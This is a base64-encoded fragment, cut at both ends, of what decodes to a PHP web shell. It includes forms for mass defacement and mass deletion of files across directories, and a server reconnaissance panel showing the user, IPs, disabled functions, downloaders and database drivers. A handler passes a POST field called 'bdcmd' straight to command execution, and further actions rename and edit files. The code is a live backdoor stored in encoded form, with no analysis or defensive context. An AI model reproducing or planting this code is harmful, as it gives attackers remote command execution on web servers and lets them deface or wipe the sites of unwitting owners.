CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGxhY2Vob2xkZXI9InRlc3QucGhwIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1iLTMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJmb3JtLWxhYmVsIj5GaWxlIENvbnRlbnQ8L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRleHRhcmVhIGNsYXNzPSJmb3JtLWNvbnRyb2wiIG5hbWU9Im1hc3NEZWZDb250ZW50IiByb3dzPSI1Ig0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBsYWNlaG9sZGVyPSJIZWxsbyBXb3JsZCI+PC90ZXh0YXJlYT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBidG4tb3V0bGluZS1saWdodCIgdHlwZT0ic3VibWl0Ij5TdWJtaXQ8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Zvcm0+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1tZC0xMiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sbGFwc2UiIGlkPSJtYXNzRGVsIiBkYXRhLWJzLXBhcmVudD0iI3Rvb2wiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cganVzdGlmeS1jb250ZW50LWNlbnRlciI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtNSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1iLTMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJmb3JtLWxhYmVsIj5EaXJlY3Rvcnk8L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIG5hbWU9Im1hc3NEZWwiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU9Ijw/PSAkcGF0aCA/PiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtYi0zIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iZm9ybS1sYWJlbCI+RmlsZSBOYW1lPC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZm9ybS1jb250cm9sIiBuYW1lPSJtYXNzRGVsTmFtZSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwbGFjZWhvbGRlcj0idGVzdC5waHAiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lLWxpZ2h0IiB0eXBlPSJzdWJtaXQiPlN1Ym1pdDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTEyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2xsYXBzZSIgaWQ9ImluZm8iIGRhdGEtYnMtcGFyZW50PSIjdG9vbCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyBqdXN0aWZ5LWNvbnRlbnQtY2VudGVyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1tZC04Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtYi0zIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJmb3JtLWxhYmVsIj5TZXJ2ZXIgSW5mbzwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0YWJsZSBjbGFzcz0idGFibGUgdGV4dC1saWdodCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPk9wZXJhdGluZyBTeXN0ZW08L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD46PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PD89ICR1bmFtZSA/PjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5Vc2VyIC8gR3JvdXA8L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD46PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PD89ICR1aWQgPz5bPD89ICR1c2VyID8+XSAvIDw/PSAkZ2lkID8+Wzw/PSAkZ3JvdXAgPz5dPC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPlBIUCBWZXJzaW9uPC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+OjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjw/PSBwaHB2ZXJzaW9uKCkgPz48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+SVAgU2VydmVyPC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+OjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjw/PSAkaXAgPz48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+WW91ciBJUDwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjo8L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48Pz0gJHVpcCA/PjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5TdG9yYWdlPC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+OjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJ0ZC1icmVhayI+VG90YWwgPSA8Pz0gZm9ybWF0U2l6ZSgkdG90YWwpID8+LCBGcmVlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID0gPD89IGZvcm1hdFNpemUoJGZyZWUpID8+IFs8Pz0gJHBlcnMgPz4lXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5Eb21haW5zPC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+OjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjw/PSAkZG9tID8+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPlNvZnR3YXJlPC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+OjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjw/PSAkc29mdCA/PjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5EaXNhYmxlIEZ1bmN0aW9uczwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjo8L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0idGQtYnJlYWsiPjw/PSAkc2hvd19kcyA/PjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5Vc2VmdWwgRnVuY3Rpb25zPC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+OjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjw/PSBydHJpbSgkdXNlZnVsLCAnLCAnKSA/PjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5Eb3dubG9hZGVyPC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+OjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjw/PSBydHJpbSgkZG93bmxvYWRlciwgJywgJykgPz48L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQgY29sc3Bhbj0iMyI+Q1VSTA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA6IDw/PSBmdW5jdGlvbl9leGlzdHMoJ2N1cmxfdmVyc2lvbicpID8gJzxmb250IGNsYXNzPSJ0ZXh0LXN1Y2Nlc3MiPk9OPC9mb250PicgOiAnPGZvbnQgY2xhc3M9InRleHQtZGFuZ2VyIj5PRkY8L2ZvbnQ+JyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8IFNTSDINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOiA8Pz0gZnVuY3Rpb25fZXhpc3RzKCdzc2gyX2Nvbm5lY3QnKSA/ICc8Zm9udCBjbGFzcz0idGV4dC1zdWNjZXNzIj5PTjwvZm9udD4nIDogJzxmb250IGNsYXNzPSJ0ZXh0LWRhbmdlciI+T0ZGPC9mb250PicgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCBNYWdpYyBRdW90ZXMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOiA8Pz0gZnVuY3Rpb25fZXhpc3RzKCdnZXRfbWFnaWNfcXVvdGVzX2dwYycpID8gJzxmb250IGNsYXNzPSJ0ZXh0LXN1Y2Nlc3MiPk9OPC9mb250PicgOiAnPGZvbnQgY2xhc3M9InRleHQtZGFuZ2VyIj5PRkY8L2ZvbnQ+JyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8IE15U1FMDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDogPD89IGZ1bmN0aW9uX2V4aXN0cygnbXlzcWxfZ2V0X2NsaWVudF9pbmZvJykgfHwgY2xhc3NfZXhpc3RzKCdteXNxbGknKSA/ICc8Zm9udCBjbGFzcz0idGV4dC1zdWNjZXNzIj5PTjwvZm9udD4nIDogJzxmb250IGNsYXNzPSJ0ZXh0LWRhbmdlciI+T0ZGPC9mb250PicgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCBNU1NRTA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA6IDw/PSBmdW5jdGlvbl9leGlzdHMoJ21zc3FsX2Nvbm5lY3QnKSA/ICc8Zm9udCBjbGFzcz0idGV4dC1zdWNjZXNzIj5PTjwvZm9udD4nIDogJzxmb250IGNsYXNzPSJ0ZXh0LWRhbmdlciI+T0ZGPC9mb250PicgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCBQb3N0Z3JlU1FMDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDogPD89IGZ1bmN0aW9uX2V4aXN0cygncGdfY29ubmVjdCcpID8gJzxmb250IGNsYXNzPSJ0ZXh0LXN1Y2Nlc3MiPk9OPC9mb250PicgOiAnPGZvbnQgY2xhc3M9InRleHQtZGFuZ2VyIj5PRkY8L2ZvbnQ+JyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8IE9yYWNsZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA6IDw/PSBmdW5jdGlvbl9leGlzdHMoJ29jaV9jb25uZWN0JykgPyAnPGZvbnQgY2xhc3M9InRleHQtc3VjY2VzcyI+T048L2ZvbnQ+JyA6ICc8Zm9udCBjbGFzcz0idGV4dC1kYW5nZXIiPk9GRjwvZm9udD4nID8+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49IjMiPlNhZmUgTW9kZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA6IDw/PSBAaW5pX2dldCgnc2FmZV9tb2RlJykgPyAnPGZvbnQgY2xhc3M9InRleHQtc3VjY2VzcyI+T048L2ZvbnQ+JyA6ICc8Zm9udCBjbGFzcz0idGV4dC1kYW5nZXIiPk9GRjwvZm9udD4nID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgT3BlbiBCYXNlZGlyIDogPD89ICRvcGVuX2IgPz4gfCBTYWZlIE1vZGUgRXhlYyBEaXINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOiA8Pz0gQGluaV9nZXQoJ3NhZmVfbW9kZV9leGVjX2RpcicpID8gJzxmb250IGNsYXNzPSJ0ZXh0LXN1Y2Nlc3MiPicgLiBAaW5pX2dldCgnc2FmZV9tb2RlX2V4ZWNfZGlyJykgLiAnPC9mb250PicgOiAnPGZvbnQgY2xhc3M9InRleHQtd2FybmluZyI+Tk9ORTwvZm9udD4nID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgU2FmZSBNb2RlIEluY2x1ZGUgRGlyDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDogPD89IEBpbmlfZ2V0KCdzYWZlX21vZGVfaW5jbHVkZV9kaXInKSA/ICc8Zm9udCBjbGFzcz0idGV4dC1zdWNjZXNzIj4nIC4gQGluaV9nZXQoJ3NhZmVfbW9kZV9pbmNsdWRlX2RpcicpIC4gJzwvZm9udD4nIDogJzxmb250IGNsYXNzPSJ0ZXh0LXdhcm5pbmciPk5PTkU8L2ZvbnQ+JyA/PjwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3RhYmxlPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+DQoNCiAgICAgICAgICAgICAgICA8P3BocCBpZiAoaXNzZXQoJF9QT1NUWydiZGNtZCddKSkgOiA/Pg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJwLTIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IGp1c3RpZnktY29udGVudC1jZW50ZXIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgdGV4dC1kYXJrIG1iLTMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cHJlPjw/cGhwIGVjaG8gJGlwIC4gIkAiIC4gJHNlcnYgLiAiOiZuYnNwO34kJm5ic3A7IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjbWQgPSAkX1BPU1RbJ2JkY21kJ107DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICRjbWQgLiAiPGJyPiI7ID8+PGJyPjxjb2RlPjw/cGhwIGVjaG8gY21kKCRjbWQpOyA/PjwvY29kZT48L3ByZT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4NCg0KICAgICAgICAgICAgICAgIDw/cGhwIGlmIChpc3NldCgkX1BPU1RbJ21hc3NEZWZEaXInXSkgJiYgaXNzZXQoJF9QT1NUWydtYXNzRGVmTmFtZSddKSAmJiBpc3NldCgkX1BPU1RbJ21hc3NEZWZDb250ZW50J10pKSA6ID8+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InAtMiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cganVzdGlmeS1jb250ZW50LWNlbnRlciI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCB0ZXh0LWRhcmsgY29sLW1kLTYgbWItMyI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwcmU+RG9uZSB+fjxicj48YnI+PD89IG1hc3NkZWYoJF9QT1NUWydtYXNzRGVmRGlyJ10sICRfUE9TVFsnbWFzc0RlZk5hbWUnXSwgJF9QT1NUWydtYXNzRGVmQ29udGVudCddKSA/PjwvcHJlPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDw/cGhwIGVuZGlmOyA/Pg0KDQogICAgICAgICAgICAgICAgPD9waHAgaWYgKGlzc2V0KCRfUE9TVFsnbWFzc0RlbCddKSAmJiBpc3NldCgkX1BPU1RbJ21hc3NEZWxOYW1lJ10pKSA6ID8+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InAtMiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cganVzdGlmeS1jb250ZW50LWNlbnRlciI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCB0ZXh0LWRhcmsgY29sLW1kLTYgbWItMyI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwcmU+RG9uZSB+fjxicj48YnI+PD89IG1hc3NkZWwoJF9QT1NUWydtYXNzRGVsJ10sICRfUE9TVFsnbWFzc0RlbE5hbWUnXSkgPz48L3ByZT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4NCg0KICAgICAgICAgICAgICAgIDw/cGhwIGlmIChpc3NldCgkX0dFVFsnYWN0aW9uJ10pICYmICRfR0VUWydhY3Rpb24nXSAhPSAnZG93bmxvYWQnKSA6ICRhY3Rpb24gPSAkX0dFVFsnYWN0aW9uJ10gPz4NCiAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4NCiAgICAgICAgICAgICAgICA8P3BocCBpZiAoaXNzZXQoJF9HRVRbJ2FjdGlvbiddKSAmJiAkX0dFVFsnYWN0aW9uJ10gIT0gJ2RlbGV0ZScpIDogJGFjdGlvbiA9ICRfR0VUWydhY3Rpb24nXSA/Pg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtMTIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IGp1c3RpZnktY29udGVudC1jZW50ZXIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1tZC01Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCRhY3Rpb24gPT0gJ3JlbmFtZScgJiYgaXNzZXQoJF9HRVRbJ2l0ZW0nXSkpIDogPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1iLTMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJuYW1lIiBjbGFzcz0iZm9ybS1sYWJlbCI+TmV3IE5hbWU8L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCIgbmFtZT0ibmV3TmFtZSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlPSI8Pz0gJF9HRVRbJ2l0ZW0nXSA/PiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLW91dGxpbmUtbGlnaHQiPlN1Ym1pdDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lLWxpZ2h0IiBvbmNsaWNrPSJoaXN0b3J5LmdvKC0xKSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJhY2sNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZWxzZWlmICgkYWN0aW9uID09ICdlZGl0JyAmJiBpc3NldCgkX0dFVFsnaXRlbSddKSkgOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWItMyI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9Im5hbWUiIG